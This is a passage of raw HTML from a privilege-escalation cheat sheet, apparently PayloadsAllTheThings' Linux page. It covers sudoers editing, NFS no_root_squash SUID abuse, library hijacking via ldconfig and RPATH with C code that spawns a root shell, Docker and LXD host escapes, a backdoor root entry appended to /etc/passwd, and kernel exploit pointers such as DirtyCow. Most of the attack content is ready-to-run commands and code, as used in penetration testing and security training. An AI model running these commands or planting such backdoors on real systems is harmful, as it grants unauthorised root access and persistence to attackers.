</span><span class="n">echo</span><span class="w"> </span><span class="s2">"username ALL=NOPASSWD: /bin/bash"</span><span class="w"> </span><span class="err">&gt;&gt;</span><span class="nx">/etc/sudoers</span><span class="w">
</span></pre></td></tr></tbody></table></code></div></div>

<h2 id="nfs-root-squashing">NFS Root Squashing</h2>

<p>When <strong>no_root_squash</strong> appears in <code class="language-plaintext highlighter-rouge">/etc/exports</code>, the folder is shareable and a remote user can mount it.</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
</pre></td><td class="rouge-code"><pre><span class="c"># remote check the name of the folder</span><span class="w">
</span><span class="n">showmount</span><span class="w"> </span><span class="nt">-e</span><span class="w"> </span><span class="nx">10.10.10.10</span><span class="w">

</span><span class="c"># create dir</span><span class="w">
</span><span class="n">mkdir</span><span class="w"> </span><span class="nx">/tmp/nfsdir</span><span class="w">  

</span><span class="c"># mount directory </span><span class="w">
</span><span class="n">mount</span><span class="w"> </span><span class="nt">-t</span><span class="w"> </span><span class="nx">nfs</span><span class="w"> </span><span class="nx">10.10.10.10:/shared</span><span class="w"> </span><span class="nx">/tmp/nfsdir</span><span class="w">    
</span><span class="n">cd</span><span class="w"> </span><span class="nx">/tmp/nfsdir</span><span class="w">

</span><span class="c"># copy wanted shell </span><span class="w">
</span><span class="n">cp</span><span class="w"> </span><span class="nx">/bin/bash</span><span class="w"> </span><span class="o">.</span><span class="w"> 	

</span><span class="c"># set suid permission</span><span class="w">
</span><span class="n">chmod</span><span class="w"> </span><span class="o">+</span><span class="nx">s</span><span class="w"> </span><span class="nx">bash</span><span class="w"> 	
</span></pre></td></tr></tbody></table></code></div></div>

<h2 id="shared-library">Shared Library</h2>

<h3 id="ldconfig">ldconfig</h3>

<p>Identify shared libraries with <code class="language-plaintext highlighter-rouge">ldd</code></p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre></td><td class="rouge-code"><pre><span class="err">$</span><span class="w"> </span><span class="n">ldd</span><span class="w"> </span><span class="nx">/opt/binary</span><span class="w">
    </span><span class="n">linux-vdso.so.1</span><span class="w"> </span><span class="p">(</span><span class="mi">0</span><span class="n">x00007ffe961cd000</span><span class="p">)</span><span class="w">
    </span><span class="n">vulnlib.so.8</span><span class="w"> </span><span class="o">=</span><span class="err">&gt;</span><span class="w"> </span><span class="n">/usr/lib/vulnlib.so.8</span><span class="w"> </span><span class="p">(</span><span class="mi">0</span><span class="n">x00007fa55e55a000</span><span class="p">)</span><span class="w">
    </span><span class="n">/lib64/ld-linux-x86-64.so.2</span><span class="w"> </span><span class="o">=</span><span class="err">&gt;</span><span class="w"> </span><span class="n">/usr/lib64/ld-linux-x86-64.so.2</span><span class="w"> </span><span class="p">(</span><span class="mi">0</span><span class="n">x00007fa55e6c8000</span><span class="p">)</span><span class="w">        
</span></pre></td></tr></tbody></table></code></div></div>

<p>Create a library in <code class="language-plaintext highlighter-rouge">/tmp</code> and activate the path.</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre></td><td class="rouge-code"><pre><span class="n">gcc</span><span class="w"> </span><span class="err">–</span><span class="nx">Wall</span><span class="w"> </span><span class="err">–</span><span class="nx">fPIC</span><span class="w"> </span><span class="err">–</span><span class="nx">shared</span><span class="w"> </span><span class="err">–</span><span class="nx">o</span><span class="w"> </span><span class="nx">vulnlib.so</span><span class="w"> </span><span class="nx">/tmp/vulnlib.c</span><span class="w">
</span><span class="n">echo</span><span class="w"> </span><span class="s2">"/tmp/"</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="nx">/etc/ld.so.conf.d/exploit.conf</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="nx">ldconfig</span><span class="w"> </span><span class="nt">-l</span><span class="w"> </span><span class="nx">/tmp/vulnlib.so</span><span class="w">
</span><span class="n">/opt/binary</span><span class="w">
</span></pre></td></tr></tbody></table></code></div></div>

<h3 id="rpath">RPATH</h3>

<div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre></td><td class="rouge-code"><pre><span class="n">level15</span><span class="err">@</span><span class="nx">nebula:/home/flag15</span><span class="err">$</span><span class="w"> </span><span class="nx">readelf</span><span class="w"> </span><span class="nt">-d</span><span class="w"> </span><span class="nx">flag15</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">egrep</span><span class="w"> </span><span class="s2">"NEEDED|RPATH"</span><span class="w">
 </span><span class="mi">0</span><span class="n">x00000001</span><span class="w"> </span><span class="p">(</span><span class="n">NEEDED</span><span class="p">)</span><span class="w">                     </span><span class="n">Shared</span><span class="w"> </span><span class="nx">library:</span><span class="w"> </span><span class="p">[</span><span class="n">libc.so.</span><span class="mi">6</span><span class="p">]</span><span class="w">
 </span><span class="mi">0</span><span class="n">x0000000f</span><span class="w"> </span><span class="p">(</span><span class="n">RPATH</span><span class="p">)</span><span class="w">                      </span><span class="n">Library</span><span class="w"> </span><span class="nx">rpath:</span><span class="w"> </span><span class="p">[</span><span class="n">/var/tmp/flag15</span><span class="p">]</span><span class="w">

</span><span class="n">level15</span><span class="err">@</span><span class="n">nebula</span><span class="p">:</span><span class="n">/home/flag15</span><span class="err">$</span><span class="w"> </span><span class="nx">ldd</span><span class="w"> </span><span class="o">.</span><span class="nx">/flag15</span><span class="w"> 
 </span><span class="n">linux</span><span class="nt">-gate</span><span class="o">.</span><span class="nf">so</span><span class="o">.</span><span class="nf">1</span><span class="w"> </span><span class="o">=</span><span class="err">&gt;</span><span class="w">  </span><span class="p">(</span><span class="mi">0</span><span class="n">x0068c000</span><span class="p">)</span><span class="w">
 </span><span class="n">libc.so.</span><span class="mi">6</span><span class="w"> </span><span class="o">=</span><span class="err">&gt;</span><span class="w"> </span><span class="n">/lib/i386-linux-gnu/libc.so.6</span><span class="w"> </span><span class="p">(</span><span class="mi">0</span><span class="n">x00110000</span><span class="p">)</span><span class="w">
 </span><span class="n">/lib/ld-linux.so.2</span><span class="w"> </span><span class="p">(</span><span class="mi">0</span><span class="n">x005bb000</span><span class="p">)</span><span class="w">
</span></pre></td></tr></tbody></table></code></div></div>

<p>By copying the lib into <code class="language-plaintext highlighter-rouge">/var/tmp/flag15/</code> it will be used by the program in this place as specified in the <code class="language-plaintext highlighter-rouge">RPATH</code> variable.</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre></td><td class="rouge-code"><pre><span class="n">level15</span><span class="err">@</span><span class="nx">nebula:/home/flag15</span><span class="err">$</span><span class="w"> </span><span class="nx">cp</span><span class="w"> </span><span class="nx">/lib/i386-linux-gnu/libc.so.6</span><span class="w"> </span><span class="nx">/var/tmp/flag15/</span><span class="w">

</span><span class="n">level15</span><span class="err">@</span><span class="nx">nebula:/home/flag15</span><span class="err">$</span><span class="w"> </span><span class="nx">ldd</span><span class="w"> </span><span class="o">.</span><span class="nx">/flag15</span><span class="w"> 
 </span><span class="n">linux-gate.so.1</span><span class="w"> </span><span class="o">=</span><span class="err">&gt;</span><span class="w">  </span><span class="p">(</span><span class="mi">0</span><span class="n">x005b0000</span><span class="p">)</span><span class="w">
 </span><span class="n">libc.so.6</span><span class="w"> </span><span class="o">=</span><span class="err">&gt;</span><span class="w"> </span><span class="n">/var/tmp/flag15/libc.so.6</span><span class="w"> </span><span class="p">(</span><span class="mi">0</span><span class="n">x00110000</span><span class="p">)</span><span class="w">
 </span><span class="n">/lib/ld-linux.so.2</span><span class="w"> </span><span class="p">(</span><span class="mi">0</span><span class="n">x00737000</span><span class="p">)</span><span class="w">
</span></pre></td></tr></tbody></table></code></div></div>

<p>Then create an evil library in <code class="language-plaintext highlighter-rouge">/var/tmp</code> with <code class="language-plaintext highlighter-rouge">gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6</code></p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre></td><td class="rouge-code"><pre><span class="c">#include&lt;stdlib.h&gt;</span><span class="w">
</span><span class="c">#define SHELL "/bin/sh"</span><span class="w">

</span><span class="n">int</span><span class="w"> </span><span class="nx">__libc_start_main</span><span class="p">(</span><span class="n">int</span><span class="w"> </span><span class="p">(</span><span class="o">*</span><span class="n">main</span><span class="p">)</span><span class="w"> </span><span class="p">(</span><span class="n">int</span><span class="p">,</span><span class="w"> </span><span class="nx">char</span><span class="w"> </span><span class="o">**</span><span class="p">,</span><span class="w"> </span><span class="nx">char</span><span class="w"> </span><span class="o">**</span><span class="p">),</span><span class="w"> </span><span class="n">int</span><span class="w"> </span><span class="nx">argc</span><span class="p">,</span><span class="w"> </span><span class="nx">char</span><span class="w"> </span><span class="o">**</span><span class="w"> </span><span class="nx">ubp_av</span><span class="p">,</span><span class="w"> </span><span class="nx">void</span><span class="w"> </span><span class="p">(</span><span class="o">*</span><span class="n">init</span><span class="p">)</span><span class="w"> </span><span class="p">(</span><span class="n">void</span><span class="p">),</span><span class="w"> </span><span class="n">void</span><span class="w"> </span><span class="p">(</span><span class="o">*</span><span class="n">fini</span><span class="p">)</span><span class="w"> </span><span class="p">(</span><span class="n">void</span><span class="p">),</span><span class="w"> </span><span class="n">void</span><span class="w"> </span><span class="p">(</span><span class="o">*</span><span class="n">rtld_fini</span><span class="p">)</span><span class="w"> </span><span class="p">(</span><span class="n">void</span><span class="p">),</span><span class="w"> </span><span class="n">void</span><span class="w"> </span><span class="p">(</span><span class="o">*</span><span class="w"> </span><span class="n">stack_end</span><span class="p">))</span><span class="w">
</span><span class="p">{</span><span class="w">
 </span><span class="n">char</span><span class="w"> </span><span class="o">*</span><span class="nx">file</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">SHELL</span><span class="p">;</span><span class="w">
 </span><span class="n">char</span><span class="w"> </span><span class="o">*</span><span class="nx">argv</span><span class="p">[]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span><span class="n">SHELL</span><span class="p">,</span><span class="nx">0</span><span class="p">};</span><span class="w">
 </span><span class="n">setresuid</span><span class="p">(</span><span class="n">geteuid</span><span class="p">(),</span><span class="n">geteuid</span><span class="p">(),</span><span class="w"> </span><span class="n">geteuid</span><span class="p">());</span><span class="w">
 </span><span class="n">execve</span><span class="p">(</span><span class="n">file</span><span class="p">,</span><span class="nx">argv</span><span class="p">,</span><span class="nx">0</span><span class="p">);</span><span class="w">
</span><span class="p">}</span><span class="w">
</span></pre></td></tr></tbody></table></code></div></div>

<h2 id="groups">Groups</h2>

<h3 id="docker">Docker</h3>

<p>Mount the filesystem in a bash container, allowing you to edit the <code class="language-plaintext highlighter-rouge">/etc/passwd</code> as root, then add a backdoor account <code class="language-plaintext highlighter-rouge">toor:password</code>.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre><span class="nv">$&gt;</span> docker run <span class="nt">-it</span> <span class="nt">--rm</span> <span class="nt">-v</span> <span class="nv">$PWD</span>:/mnt bash
<span class="nv">$&gt;</span> <span class="nb">echo</span> <span class="s1">'toor:$1$.ZcF5ts0$i4k6rQYzeegUkacRCvfxC0:0:0:root:/root:/bin/sh'</span> <span class="o">&gt;&gt;</span> /mnt/etc/passwd
</pre></td></tr></tbody></table></code></div></div>

<p>Almost similar but you will also see all processes running on the host and be connected to the same NICs.</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="n">docker</span><span class="w"> </span><span class="nx">run</span><span class="w"> </span><span class="nt">--rm</span><span class="w"> </span><span class="nt">-it</span><span class="w"> </span><span class="nt">--pid</span><span class="o">=</span><span class="n">host</span><span class="w"> </span><span class="nt">--net</span><span class="o">=</span><span class="n">host</span><span class="w"> </span><span class="nt">--privileged</span><span class="w"> </span><span class="nt">-v</span><span class="w"> </span><span class="nx">/:/host</span><span class="w"> </span><span class="nx">ubuntu</span><span class="w"> </span><span class="nx">bash</span><span class="w">
</span></pre></td></tr></tbody></table></code></div></div>

<p>Or use the following docker image from <a href="https://hub.docker.com/r/chrisfosterelli/rootplease/">chrisfosterelli</a> to spawn a root shell</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
</pre></td><td class="rouge-code"><pre><span class="err">$</span><span class="w"> </span><span class="n">docker</span><span class="w"> </span><span class="nx">run</span><span class="w"> </span><span class="nt">-v</span><span class="w"> </span><span class="nx">/:/hostOS</span><span class="w"> </span><span class="nt">-i</span><span class="w"> </span><span class="nt">-t</span><span class="w"> </span><span class="nx">chrisfosterelli/rootplease</span><span class="w">
</span><span class="n">latest:</span><span class="w"> </span><span class="nx">Pulling</span><span class="w"> </span><span class="nx">from</span><span class="w"> </span><span class="nx">chrisfosterelli/rootplease</span><span class="w">
</span><span class="mi">2</span><span class="n">de59b831a23:</span><span class="w"> </span><span class="nx">Pull</span><span class="w"> </span><span class="nx">complete</span><span class="w"> 
</span><span class="mi">354</span><span class="n">c3661655e:</span><span class="w"> </span><span class="nx">Pull</span><span class="w"> </span><span class="nx">complete</span><span class="w"> 
</span><span class="mi">91930878</span><span class="n">a2d7:</span><span class="w"> </span><span class="nx">Pull</span><span class="w"> </span><span class="nx">complete</span><span class="w"> 
</span><span class="n">a3ed95caeb02:</span><span class="w"> </span><span class="nx">Pull</span><span class="w"> </span><span class="nx">complete</span><span class="w"> 
</span><span class="mi">489</span><span class="n">b110c54dc:</span><span class="w"> </span><span class="nx">Pull</span><span class="w"> </span><span class="nx">complete</span><span class="w"> 
</span><span class="n">Digest:</span><span class="w"> </span><span class="nx">sha256:07f8453356eb965731dd400e056504084f25705921df25e78b68ce3908ce52c0</span><span class="w">
</span><span class="n">Status:</span><span class="w"> </span><span class="nx">Downloaded</span><span class="w"> </span><span class="nx">newer</span><span class="w"> </span><span class="nx">image</span><span class="w"> </span><span class="nx">for</span><span class="w"> </span><span class="nx">chrisfosterelli/rootplease:latest</span><span class="w">

</span><span class="n">You</span><span class="w"> </span><span class="nx">should</span><span class="w"> </span><span class="nx">now</span><span class="w"> </span><span class="nx">have</span><span class="w"> </span><span class="nx">a</span><span class="w"> </span><span class="nx">root</span><span class="w"> </span><span class="nx">shell</span><span class="w"> </span><span class="nx">on</span><span class="w"> </span><span class="nx">the</span><span class="w"> </span><span class="nx">host</span><span class="w"> </span><span class="nx">OS</span><span class="w">
</span><span class="n">Press</span><span class="w"> </span><span class="nx">Ctrl-D</span><span class="w"> </span><span class="nx">to</span><span class="w"> </span><span class="nx">exit</span><span class="w"> </span><span class="nx">the</span><span class="w"> </span><span class="nx">docker</span><span class="w"> </span><span class="nx">instance</span><span class="w"> </span><span class="nx">/</span><span class="w"> </span><span class="nx">shell</span><span class="w">

</span><span class="n">sh-5.0</span><span class="c"># id</span><span class="w">
</span><span class="n">uid</span><span class="o">=</span><span class="mi">0</span><span class="p">(</span><span class="n">root</span><span class="p">)</span><span class="w"> </span><span class="n">gid</span><span class="o">=</span><span class="mi">0</span><span class="p">(</span><span class="n">root</span><span class="p">)</span><span class="w"> </span><span class="n">groups</span><span class="o">=</span><span class="mi">0</span><span class="p">(</span><span class="n">root</span><span class="p">)</span><span class="w">
</span></pre></td></tr></tbody></table></code></div></div>

<p>More docker privilege escalation using the Docker Socket.</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre><span class="n">sudo</span><span class="w"> </span><span class="nx">docker</span><span class="w"> </span><span class="nt">-H</span><span class="w"> </span><span class="nx">unix:///google/host/var/run/docker.sock</span><span class="w"> </span><span class="nx">run</span><span class="w"> </span><span class="nt">-v</span><span class="w"> </span><span class="nx">/:/host</span><span class="w"> </span><span class="nt">-it</span><span class="w"> </span><span class="nx">ubuntu</span><span class="w"> </span><span class="nx">chroot</span><span class="w"> </span><span class="nx">/host</span><span class="w"> </span><span class="nx">/bin/bash</span><span class="w">
</span><span class="n">sudo</span><span class="w"> </span><span class="nx">docker</span><span class="w"> </span><span class="nt">-H</span><span class="w"> </span><span class="nx">unix:///google/host/var/run/docker.sock</span><span class="w"> </span><span class="nx">run</span><span class="w"> </span><span class="nt">-it</span><span class="w"> </span><span class="nt">--privileged</span><span class="w"> </span><span class="nt">--pid</span><span class="o">=</span><span class="n">host</span><span class="w"> </span><span class="nx">debian</span><span class="w"> </span><span class="nx">nsenter</span><span class="w"> </span><span class="nt">-t</span><span class="w"> </span><span class="nx">1</span><span class="w"> </span><span class="nt">-m</span><span class="w"> </span><span class="nt">-u</span><span class="w"> </span><span class="nt">-n</span><span class="w"> </span><span class="nt">-i</span><span class="w"> </span><span class="nx">sh</span><span class="w">
</span></pre></td></tr></tbody></table></code></div></div>

<h3 id="lxclxd">LXC/LXD</h3>

<p>The privesc requires to run a container with elevated privileges and mount the host filesystem inside.</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre></td><td class="rouge-code"><pre><span class="err">╭─</span><span class="n">swissky</span><span class="err">@</span><span class="nx">lab</span><span class="w"> </span><span class="nx">~</span><span class="w">  
</span><span class="err">╰─$</span><span class="w"> </span><span class="n">id</span><span class="w">
</span><span class="nx">uid</span><span class="o">=</span><span class="mi">1000</span><span class="p">(</span><span class="n">swissky</span><span class="p">)</span><span class="w"> </span><span class="n">gid</span><span class="o">=</span><span class="mi">1000</span><span class="p">(</span><span class="n">swissky</span><span class="p">)</span><span class="w"> </span><span class="n">groupes</span><span class="o">=</span><span class="mi">1000</span><span class="p">(</span><span class="n">swissky</span><span class="p">),</span><span class="mi">3</span><span class="p">(</span><span class="n">sys</span><span class="p">),</span><span class="mi">90</span><span class="p">(</span><span class="n">network</span><span class="p">),</span><span class="mi">98</span><span class="p">(</span><span class="n">power</span><span class="p">),</span><span class="mi">110</span><span class="p">(</span><span class="n">lxd</span><span class="p">),</span><span class="mi">991</span><span class="p">(</span><span class="n">lp</span><span class="p">),</span><span class="mi">998</span><span class="p">(</span><span class="n">wheel</span><span class="p">)</span><span class="w">
</span></pre></td></tr></tbody></table></code></div></div>

<p>Build an Alpine image and start it using the flag <code class="language-plaintext highlighter-rouge">security.privileged=true</code>, forcing the container to interact as root with the host filesystem.</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
</pre></td><td class="rouge-code"><pre><span class="c"># build a simple alpine image</span><span class="w">
</span><span class="n">git</span><span class="w"> </span><span class="nx">clone</span><span class="w"> </span><span class="nx">https://github.com/saghul/lxd-alpine-builder</span><span class="w">
</span><span class="o">.</span><span class="n">/build-alpine</span><span class="w"> </span><span class="nt">-a</span><span class="w"> </span><span class="nx">i686</span><span class="w">

</span><span class="c"># import the image</span><span class="w">
</span><span class="n">lxc</span><span class="w"> </span><span class="nx">image</span><span class="w"> </span><span class="nx">import</span><span class="w"> </span><span class="o">.</span><span class="nx">/alpine.tar.gz</span><span class="w"> </span><span class="nt">--alias</span><span class="w"> </span><span class="nx">myimage</span><span class="w">

</span><span class="c"># run the image</span><span class="w">
</span><span class="n">lxc</span><span class="w"> </span><span class="nx">init</span><span class="w"> </span><span class="nx">myimage</span><span class="w"> </span><span class="nx">mycontainer</span><span class="w"> </span><span class="nt">-c</span><span class="w"> </span><span class="nx">security.privileged</span><span class="o">=</span><span class="n">true</span><span class="w">

</span><span class="c"># mount the /root into the image</span><span class="w">
</span><span class="n">lxc</span><span class="w"> </span><span class="nx">config</span><span class="w"> </span><span class="nx">device</span><span class="w"> </span><span class="nx">add</span><span class="w"> </span><span class="nx">mycontainer</span><span class="w"> </span><span class="nx">mydevice</span><span class="w"> </span><span class="nx">disk</span><span class="w"> </span><span class="nx">source</span><span class="o">=</span><span class="n">/</span><span class="w"> </span><span class="nx">path</span><span class="o">=</span><span class="n">/mnt/root</span><span class="w"> </span><span class="nx">recursive</span><span class="o">=</span><span class="n">true</span><span class="w">

</span><span class="c"># interact with the container</span><span class="w">
</span><span class="n">lxc</span><span class="w"> </span><span class="nx">start</span><span class="w"> </span><span class="nx">mycontainer</span><span class="w">
</span><span class="n">lxc</span><span class="w"> </span><span class="nx">exec</span><span class="w"> </span><span class="nx">mycontainer</span><span class="w"> </span><span class="nx">/bin/sh</span><span class="w">
</span></pre></td></tr></tbody></table></code></div></div>

<p>Alternatively https://github.com/initstring/lxd_root</p>

<h2 id="kernel-exploits">Kernel Exploits</h2>

<p>Precompiled exploits can be found inside these repositories, run them at your own risk !</p>
<ul>
  <li><a href="https://github.com/offensive-security/exploitdb-bin-sploits/tree/master/bin-sploits">bin-sploits - @offensive-security</a></li>
  <li><a href="https://github.com/lucyoa/kernel-exploits/">kernel-exploits - @lucyoa</a></li>
</ul>

<p>The following exploits are known to work well, search for more exploits with <code class="language-plaintext highlighter-rouge">searchsploit -w linux kernel centos</code>.</p>

<p>Another way to find a kernel exploit is to get the specific kernel version and linux distro of the machine by doing <code class="language-plaintext highlighter-rouge">uname -a</code>
Copy the kernel version and distribution, and search for it in google or in https://www.exploit-db.com/.</p>

<h3 id="cve-2016-5195-dirtycow">CVE-2016-5195 (DirtyCow)</h3>

<p>Linux Privilege Escalation - Linux Kernel &lt;= 3.19.0-73.8</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre></td><td class="rouge-code"><pre><span class="c"># make dirtycow stable</span><span class="w">
</span><span class="n">echo</span><span class="w"> </span><span class="nx">0</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="nx">/proc/sys/vm/dirty_writeback_centisecs</span><span class="w">
</span><span class="n">g</span><span class="o">++</span><span class="w"> </span><span class="nt">-Wall</span><span class="w"> </span><span class="nt">-pedantic</span><span class="w"> </span><span class="nt">-O2</span><span class="w"> </span><span class="nt">-std</span><span class="o">=</span><span class="n">c</span><span class="o">++</span><span class="nx">11</span><span class="w"> </span><span class="nt">-pthread</span><span class="w"> </span><span class="nt">-o</span><span class="w"> </span><span class="nx">dcow</span><span class="w"> </span><span class="nx">40847.cpp</span><span class="w"> </span><span class="nt">-lutil</span><span class="w">
</span><span class="n">https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs</span><span class="w">
</span><span class="nx">https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c</span><span class="w">
</span></pre></td></tr></tbody></table></code></div></div>

<h3 id="cve-2010-3904-rds">CVE-2010-3904 (RDS)</h3>

<p>Linux RDS Exploit - Linux Kernel &lt;= 2.6.36-rc8</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="n">https://www.exploit-db.com/exploits/15285/</span><span class="w">
</span></pre></td></tr></tbody></table></code></div></div>

<h3 id="cve-2010-4258-full-nelson">CVE-2010-4258 (Full Nelson)</h3>

<p>Linux Kernel 2.6.37 (RedHat / Ubuntu 10.04)</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="n">https://www.exploit-db.com/exploits/15704/</span><span class="w">
</span></pre></td></tr></tbody></table></code></div></div>

<h3 id="cve-2012-0056-mempodipper">CVE-2012-0056 (Mempodipper)</h3>

<p>Linux Kernel 2.6.39 &lt; 3.2.2 (Gentoo / Ubuntu x86/x64)</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="n">https://www.exploit-db.com/exploits/18411</span><span class="w">
</span></pre></td></tr></tbody></table></code></div></div>

<h2 id="references">References</h2>

<ul>
  <li><a href="https://mn3m.info/posts/suid-vs-capabilities/">SUID vs Capabilities - Dec 7, 2017 - Nick Void aka mn3m</a></li>
  <li><a href="https://fosterelli.co/privilege-escalation-via-docker.html">Privilege escalation via Docker - April 22, 2015 - Chris Foster</a></li>
  <li><a href="https://nxnjz.net/2018/08/an-interesting-privilege-escalation-vector-getcap/">An Interesting Privilege Escalation vector (getcap/setcap) - NXNJZ - AUGUST 21, 2018</a></li>
  <li><a href="https://www.helpnetsecurity.com/2014/06/27/exploiting-wildcards-on-linux/">Exploiting wildcards on Linux - Berislav Kucan</a></li>
  <li><a href="http://p4pentest.in/2016/10/19/code-execution-with-tar-command/">Code Execution With Tar Command - p4pentest</a></li>
  <li><a href="http://www.defensecode.com/public/DefenseCode_Unix_WildCards_Gone_Wild.txt">Back To The Future: Unix Wildcards Gone Wild - Leon Juranic</a></li>
  <li><a href="https://www.securitynewspaper.com/2018/04/25/use-weak-nfs-permissions-escalate-linux-privileges/">HOW TO EXPLOIT WEAK NFS PERMISSIONS THROUGH PRIVILEGE ESCALATION? - APRIL 25, 2018</a></li>
  <li><a href="https://reboare.github.io/lxd/lxd-escape.html">Privilege Escalation via lxd - @reboare</a></li>
  <li><a href="https://www.hackingarticles.in/editing-etc-passwd-file-for-privilege-escalation/">Editing /etc/passwd File for Privilege Escalation - Raj Chandel - MAY 12, 2018</a></li>
  <li><a href="https://github.com/nongiach/sudo_inject">Privilege Escalation by injecting process possessing sudo tokens - @nongiach @chaignc</a></li>
  <li><a href="http://www.deer-run.com/~hal/sysadmin/pam_cracklib.html">Linux Password Security with pam_cracklib - Hal Pomeranz, Deer Run Associates</a></li>
  <li><a href="https://github.com/sagishahar/lpeworkshop/blob/master/Local%20Privilege%20Escalation%20Workshop%20-%20Slides.pdf">Local Privilege Escalation Workshop - Slides.pdf - @sagishahar</a></li>
  <li><a href="https://github.com/weaknetlabs/Penetration-Testing-Grimoire/blob/master/Vulnerabilities/SSH/key-exploit.md">SSH Key Predictable PRNG (Authorized_Keys) Process - @weaknetlabs</a></li>
</ul>


      </div>

      <div class="post-tail-wrapper text-muted">

        <!-- categories -->
        
        <div class="post-meta mb-3">
          <i class="far fa-folder-open fa-fw mr-1"></i>
          
            <a href='/categories/methodology-and-resource/'>Methodology and Resource</a>,
            <a href='/categories/linux/'>Linux</a>
        </div>
        

        <!-- tags -->
        
        <div class="post-tags">
          <i class="fa fa-tags fa-fw mr-1"></i>
          
          <a href="/tags/linux/"
            class="post-tag no-text-decoration" >Linux</a>
          
          </div>
        

        <div class="post-tail-bottom
          d-flex justify-content-between align-items-center mt-3 pt-5 pb-2">
          
          <div class="license-wrapper">
            This post is licensed under
            <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a>
            by the author.
          </div>
          

          <!--
 Post sharing snippet
-->

<div class="share-wrapper">
  <span class="share-label text-muted mr-1">Share</span>
  <span class="share-icons">
    
    

    
      
        <a href="https://twitter.com/intent/tweet?text=Linux - Privilege Escalation - PayloadsAllTheThings&url=http://localhost:4000/Linux-Privilege-Escalation/" data-toggle="tooltip" data-placement="top"
          title="Twitter" target="_blank" rel="noopener" aria-label="Twitter">
          <i class="fa-fw fab fa-twitter"></i>
        </a>
    
      
        <a href="https://www.facebook.com/sharer/sharer.php?title=Linux - Privilege Escalation - PayloadsAllTheThings&u=http://localhost:4000/Linux-Privilege-Escalation/" data-toggle="tooltip" data-placement="top"
          title="Facebook" target="_blank" rel="noopener" aria-label="Facebook">
          <i class="fa-fw fab fa-facebook-square"></i>
        </a>
    
      
        <a href="https://telegram.me/share?text=Linux - Privilege Escalation - PayloadsAllTheThings&url=http://localhost:4000/Linux-Privilege-Escalation/" data-toggle="tooltip" data-placement="top"
          title="Telegram" target="_blank" rel="noopener" aria-label="Telegram">
          <i class="fa-fw fab fa-telegram"></i>
        </a>
    

    <i class="fa-fw fas fa-link small" onclick="copyLink()"
        data-toggle="tooltip" data-placement="top" title="Copy link"></i>

  </span>
</div>


        </div><!-- .post-tail-bottom -->

      </div><!-- div.post-tail -->

    </div> <!-- .post -->


  </div> <!-- #post-wrapper -->

  

  

  <!--
  The Pannel on right side (Desktop views)
-->

<div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down">

  <div class="access">

  














  

  















  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
